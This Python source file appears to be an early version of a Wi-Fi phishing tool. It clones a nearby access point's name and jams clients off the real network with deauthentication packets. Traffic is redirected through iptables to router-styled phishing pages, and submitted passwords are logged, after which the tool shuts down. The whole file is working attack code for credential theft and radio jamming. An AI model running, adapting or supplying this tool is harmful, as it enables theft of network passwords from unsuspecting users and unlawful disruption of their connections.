#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import ssl
import re
import time
import sys
import SimpleHTTPServer
import BaseHTTPServer
import ConfigParser
import httplib
import SocketServer
import cgi
import string
import lib.fakeAP as fap
import lib.wifijammer as wj
from threading import Thread
from subprocess import Popen, PIPE, check_output
from scapy.all import *
conf.verb = 0

# Basic configuration
PORT = 8085
SSL_PORT = 445
PEM = 'cert/server.pem'
CONFIG = "config/config.ini"
PHISING_PAGES = "access-point-pages"
DN = open(os.devnull, 'w')

# Console colors
W = '\033[0m'    # white (normal)
R = '\033[31m'   # red
G = '\033[32m'   # green
O = '\033[33m'   # orange
B = '\033[34m'   # blue
P = '\033[35m'   # purple
C = '\033[36m'   # cyan
GR = '\033[37m'  # gray
T = '\033[93m'   # tan


class SecureHTTPServer(BaseHTTPServer.HTTPServer):
    """
    Simple HTTP server that extends the SimpleHTTPServer standard
    module to support the SSL protocol.

    Only the server is authenticated while the client remains
    unauthenticated (i.e. the server will not request a client
    certificate).

    It also reacts to self.stop flag.
    """
    def __init__(self, server_address, HandlerClass):
        SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
        fpem = PEM
        self.socket = ssl.SSLSocket(
            socket.socket(self.address_family, self.socket_type),
            keyfile=fpem,
            certfile=fpem
        )

        self.server_bind()
        self.server_activate()

    def serve_forever(self):
        """
        Handles one request at a time until stopped.
        """
        self.stop = False
        while not self.stop:
            self.handle_request()


class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """
    Request handler for the HTTPS server. It responds to
    everything with a 301 redirection to the HTTP server.
    """
    def do_QUIT(self):
        """
        Sends a 200 OK response, and sets server.stop to True
        """
        self.send_response(200)
        self.end_headers()
        self.server.stop = True

    def setup(self):
        self.connection = self.request
        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://10.0.0.1:' + str(PORT))
        self.end_headers()

    def log_message(self, format, *args):
        return


class HTTPServer(BaseHTTPServer.HTTPServer):
    """
    HTTP server that reacts to self.stop flag.
    """

    def serve_forever(self):
        """
        Handle one request at a time until stopped.
        """
        self.stop = False
        while not self.stop:
            self.handle_request()


class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """
    Request handler for the HTTP server that logs POST requests.
    """
    def do_QUIT(self):
        """
        Sends a 200 OK response, and sets server.stop to True
        """
        self.send_response(200)
        self.end_headers()
        self.server.stop = True

    def do_GET(self):

        if not os.path.isfile(CONFIG):
            sys.exit()
            stop_server()
        d = config_section_map("Router")

        if self.path == "/":
            with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
                log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
                               self.client_address[0] + W + "\n"
                               )
                log_file.close()
            self.path = "index.html"
        self.path = "%s/%s/%s" % (PHISING_PAGES, d['router'], self.path)

        if self.path.endswith(".html"):
            if not os.path.isfile(self.path):
                self.send_response(404)
                return
            f = open(self.path)
            s = string.Template(f.read())
            s = s.substitute(d)
            self.send_response(200)
            self.send_header('Content-type', 'text-html')
            self.end_headers()
            # Send file content to client
            self.wfile.write(s)
            f.close()
        # Leave binary and other data to default handler.
        else:
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST',
                     'CONTENT_TYPE': self.headers['Content-Type'],
                     })
        for item in form.list:
            if item.value:
                if re.match("\A[\x20-\x7e]+\Z", item.value):
                    self.send_response(301)
                    self.send_header('Location', '/upgrading.html')
                    self.end_headers()
                    with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
                        log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
                                       T + self.client_address[0] +
                                       R + " password=" + item.value +
                                       W + "\n"
                                       )
                        log_file.close()
                    return

    def log_message(self, format, *args):
        return


def stop_server(port=PORT, ssl_port=SSL_PORT):
    """
    Sends QUIT request to HTTP server running on localhost:<port>
    """
    conn = httplib.HTTPConnection("localhost:%d" % port)
    conn.request("QUIT", "/")
    conn.getresponse()

    conn = httplib.HTTPSConnection("localhost:%d" % ssl_port)
    conn.request("QUIT", "/")
    conn.getresponse()


def config_section_map(section):
    """
    Maps the values of a config file to a dictionary.
    """
    config = ConfigParser.ConfigParser()
    config.read(CONFIG)
    dict1 = {}
    options = config.options(section)
    for option in options:
        try:
            dict1[option] = config.get(section, option)
        except:
            print("exception on %s!" % option)
            dict1[option] = None
    return dict1


def sniff_dot11(mon_iface):
    """
    Taken from wifijammer. We need this here to run it from a thread.
    """
    try:
        sniff(iface=mon_iface, store=0, prn=wj.cb)
    except Exception:
        pass


def shutdown():
    """
    Shutdowns program.
    """
    stop_server()
    with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
        forward.write(fap.forw)
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('pkill airbase-ng')
    os.system('pkill dhcpd')
    if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
        os.remove('/tmp/wifiphisher-webserver.tmp')
    if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
        os.remove('/tmp/wifiphisher-jammer.tmp')
    fap.rm_mon()
    if not wj.monitor_on:
        wj.remove_mon_iface(mon_iface)
    print '\n[' + R + '!' + W + '] Closing'
    sys.exit(0)

if __name__ == "__main__":

    # Start HTTP server in a background thread
    Handler = HTTPRequestHandler
    httpd = HTTPServer(("", PORT), Handler)
    print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
    webserver = Thread(target=httpd.serve_forever)
    webserver.daemon = True
    webserver.start()

    # Start HTTPS server in a background thread
    Handler = SecureHTTPRequestHandler
    httpd = SecureHTTPServer(("", SSL_PORT), Handler)
    print '[' + T + '*' + W + '] Starting HTTPS server at port ' + str(SSL_PORT)
    secure_webserver = Thread(target=httpd.serve_forever)
    secure_webserver.daemon = True
    secure_webserver.start()

    # Are you root?
    if os.geteuid():
        sys.exit('[' + R + '-' + W + '] Please run as root')

    # Get isc dhcp server if needed
    fap.get_isc_dhcp_server()

    # Parse fap args
    fap.args = fap.parse_args()
    global ipf, mon_iface, ap_mac
    channel = '1'
    if fap.args.channel:
        channel = fap.args.channel
    essid = 'Free Wifi'
    if fap.args.essid:
        essid = fap.args.essid

    # Get interfaces
    monitors, interfaces = fap.iwconfig()
    fap.rm_mon()
    inet_iface, ipprefix = fap.internet_info(interfaces)
    wj_iface = wj.get_mon_iface(wj.parse_args(), inet_iface)
    ap_iface = fap.AP_iface(interfaces, inet_iface, wj_iface)
    if not ap_iface:
        sys.exit('[' + R + '-' + W + '] Found internet connected interface in ' + T + inet_iface + W + '. \
        Please bring up a wireless interface to use as the fake access point.')
    ipf = fap.iptables(inet_iface)

    # Set iptable rules and kernel variables.
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:%s' % PORT)
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:%s' % SSL_PORT)
    Popen(['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'], stdout=DN, stderr=PIPE)

    print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
    mon_iface = fap.start_monitor(ap_iface, channel)
    mon_mac = fap.get_mon_mac(mon_iface)

    # Copy AP
    time.sleep(3)
    hop = fap.Thread(target=fap.channel_hop, args=(mon_iface,))
    hop.daemon = True
    hop.start()
    fap.sniffing(mon_iface, fap.targeting_cb)
    channel, essid, ap_mac = fap.copy_AP()

    # Start AP
    fap.start_ap(mon_iface, channel, essid, fap.args)
    dhcpconf = fap.dhcp_conf(ipprefix)
    fap.dhcp(dhcpconf, ipprefix)
    os.system('clear')
    print '[' + T + '*' + W + '] ' + T + \
          essid + W + ' set up on channel ' + \
          T + channel + W + ' via ' + T + mon_iface \
          + W + ' on ' + T + ap_iface + W

    # wifijammer initialization
    wj.clients_APs = []
    wj.APs = []
    wj.DN = open(os.devnull, 'w')
    wj.lock = wj.Lock()
    wj.args = wj.parse_args()
    wj.args.accesspoint = ap_mac
    wj.args.channel = channel
    wj.monitor_on = None
    wj.conf.iface = wj_iface
    wj.mon_MAC = wj.mon_mac(wj_iface)
    wj.first_pass = 1

    # Start channel hopping
    wj.hop = wj.Thread(target=wj.channel_hop, args=(wj_iface, wj.args))
    wj.hop.daemon = True
    wj.hop.start()

    wj.sniff = wj.Thread(target=sniff_dot11, args=(wj_iface,))
    wj.sniff.daemon = True
    wj.sniff.start()

    # Main loop.
    try:
        while 1:
            os.system("clear")
            print "Jamming devices: "
            if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
                proc = check_output(['cat', '/tmp/wifiphisher-jammer.tmp'])
                lines = proc.split('\n')
                lines += ["\n"] * (5 - len(lines))
            else:
                lines = ["\n"] * 5
            for l in lines:
                print l
            print "DHCP Leases: "
            proc = check_output(['cat', '/var/lib/dhcp/dhcpd.leases'])
            matches = re.findall("\n  (client-hostname .*);\n", proc)
            matches += ["\n"] * (5 - len(matches))
            for m in matches:
                print m
            print "HTTP requests: "
            if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
                proc = check_output(['tail', '-5', '/tmp/wifiphisher-webserver.tmp'])
                lines = proc.split('\n')
                lines += ["\n"] * (5 - len(lines))
            else:
                lines = ["\n"] * 5
            for l in lines:
                print l
                # We got a victim. Shutdown everything.
                if "password" in l:
                    shutdown()
            time.sleep(1)
    except KeyboardInterrupt:
        shutdown()
